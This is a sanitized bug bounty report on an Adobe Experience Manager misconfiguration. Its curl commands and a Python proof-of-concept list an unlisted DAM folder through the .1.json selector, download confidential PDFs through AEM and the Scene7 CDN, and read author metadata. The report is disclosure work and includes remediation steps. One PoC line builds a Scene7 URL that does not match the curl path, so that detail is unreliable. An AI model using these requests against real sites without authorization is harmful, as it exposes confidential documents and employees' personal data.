---
title: "Confidential Document Disclosure via AEM DAM and CDN Bypass | Bug Bounty Report"
published: 2026-06-01
description: "Bug bounty report: an unauthenticated Adobe Experience Manager DAM folder exposed confidential vendor security policy documents through two independent access paths. Details redacted to protect the affected organization."
tags: ["Bug Bounty", "Information Disclosure", "AEM", "YesWeHack"]
category: "Bug Bounty Reports"
---

> [!NOTE]
> This report has been sanitized for public portfolio use. The target organization, program name, all URLs, document names, and any personal information encountered during testing have been redacted or replaced with placeholders. Only the technical mechanism of the vulnerability is preserved.

## Program Overview

The target ran a public-facing website on **Adobe Experience Manager (AEM)**, with its Digital Asset Manager (DAM) also replicating published assets to **Adobe Scene7**, a separate content delivery network. Testing was performed through a private bug bounty program hosted on YesWeHack, under its authorized scope and responsible disclosure policy.

## Finding: Unauthenticated Access to a Non-Public DAM Folder via Two Independent Paths

> [!CAUTION]
> **Severity: High.** Unauthenticated disclosure of internal, confidentially classified documents and associated personal data, reachable through two separate systems.

A folder under the site's DAM, intended to be unlisted and excluded from search indexing via `robots.txt`, was still directly reachable by any unauthenticated user through AEM's default Sling GET servlet. The same assets were also independently reachable through the site's Adobe Scene7 CDN deployment, a second path that bypasses the AEM Dispatcher entirely.

## Reproduction Steps

Appending AEM's `.1.json` selector to the unlisted folder's path returned a structured JSON listing of every file and subfolder inside it, with no authentication required:

```bash frame="code"
curl -s "https://redacted-target.example/content/dam/redacted/global/unlisted/documents.1.json" \
     -H "User-Agent: Mozilla/5.0"
```

The response was a complete directory listing of the supposedly unlisted folder:

```json
{
  "jcr:primaryType": "sling:Folder",
  "vendor-security-requirements-appendix.pdf": {"jcr:primaryType": "dam:Asset"},
  "compliance-amendment-critical-supplier.pdf": {"jcr:primaryType": "dam:Asset"},
  "compliance-amendment-non-critical-suppliers.pdf": {"jcr:primaryType": "dam:Asset"},
  "manuals": {"jcr:primaryType": "sling:Folder"},
  "brochures": {"jcr:primaryType": "sling:Folder"},
  "infographics": {"jcr:primaryType": "sling:Folder"}
}
```

Any listed document could then be downloaded directly:

```bash frame="code"
curl -s "https://redacted-target.example/content/dam/redacted/global/unlisted/documents/vendor-security-requirements-appendix.pdf" \
     -H "User-Agent: Mozilla/5.0" -o appendix.pdf
```

The same DAM assets are configured to replicate to the organization's Adobe Scene7 instance for public content delivery. Because Scene7 has no awareness of AEM's folder-level access restrictions, the identical file was retrievable through it as a fully independent path, one that would remain open even if the AEM route were patched:

```bash frame="code"
curl -s "https://s7g10.scene7.com/is/content/redactedtarget/vendor-security-requirements-appendix.pdf" \
     -H "User-Agent: Mozilla/5.0" -o appendix-scene7.pdf
```

Converting the downloaded file confirmed it was a genuine, currently in-force internal governance document, versioned and dated, and explicitly marked as confidential in its own text rather than a stale or public-facing artifact.

```bash frame="code"
pdftotext appendix.pdf -
```

Reading the asset's JCR content metadata additionally disclosed the internal email address and full name of the employee who had uploaded and authored the document, information not intended for external exposure:

```bash frame="code"
curl -s "https://redacted-target.example/content/dam/redacted/global/unlisted/documents/compliance-amendment-critical-supplier.pdf/jcr:content.json" \
     -H "User-Agent: Mozilla/5.0"
```

## Proof of Concept

The auditor scripted the full chain to demonstrate reproducibility end to end, from enumeration through both download paths to content verification, using no authentication, account, or specialized tooling:

```python
import urllib.request, json, subprocess

UA = "Mozilla/5.0"
BASE = "https://redacted-target.example/content/dam/redacted/global/unlisted"

req = urllib.request.Request(f"{BASE}/documents.1.json", headers={"User-Agent": UA})
listing = json.loads(urllib.request.urlopen(req, timeout=10).read())
files = [k for k in listing if not k.startswith("jcr:")]
print(f"Files found: {len(files)}")

target = "vendor-security-requirements-appendix.pdf"
req2 = urllib.request.Request(f"{BASE}/documents/{target}", headers={"User-Agent": UA})
data = urllib.request.urlopen(req2, timeout=15).read()
assert data[:4] == b"%PDF"
print(f"Downloaded via AEM: {len(data)} bytes")

req3 = urllib.request.Request(
    f"https://s7g10.scene7.com/is/content/redactedtarget/{target.replace('.pdf', 'pdf')}",
    headers={"User-Agent": UA},
)
data3 = urllib.request.urlopen(req3, timeout=15).read()
assert data3[:4] == b"%PDF"
print(f"Downloaded via Scene7: {len(data3)} bytes -- same file confirmed")
```

Both requests returned the identical 186 KB PDF, confirming the two access paths serve the same underlying confidential asset.

## Impact

The exposed folder contained documents the organization's own internal classification marked as confidential, including a vendor security governance policy and regulatory compliance amendment templates describing the security obligations placed on its third-party suppliers. Their disclosure gave any unauthenticated party visibility into the organization's internal vendor risk management posture. Document metadata further disclosed the name and email address of an internal employee, a secondary personal data exposure layered on top of the document leak itself. Because the same content was reachable through two independently configured systems, AEM and Scene7, patching only one would have left the other path open, materially increasing the risk of incomplete remediation.

## Remediation

- Restrict public access to the unlisted DAM directory at the AEM Dispatcher level, and block `.json` folder-listing requests against non-public content paths.
- Ensure the Sling default GET servlet cannot serve assets outside explicitly published, public DAM folders.
- Remove unpublished or internal-only assets from the CDN replication target, or configure selective publishing so that internal folders are never pushed to it in the first place.
- Audit other DAM directories for the same exposure pattern across both the origin CMS and any CDN or edge replication target.
- Strip or restrict access to JCR authorship and modification metadata on any publicly reachable asset.

## Disclosure

This report was submitted through the program's YesWeHack channel. It was triaged and closed as a **duplicate** of a previously reported issue; the underlying finding was independently rediscovered and reproduced end to end as documented above.
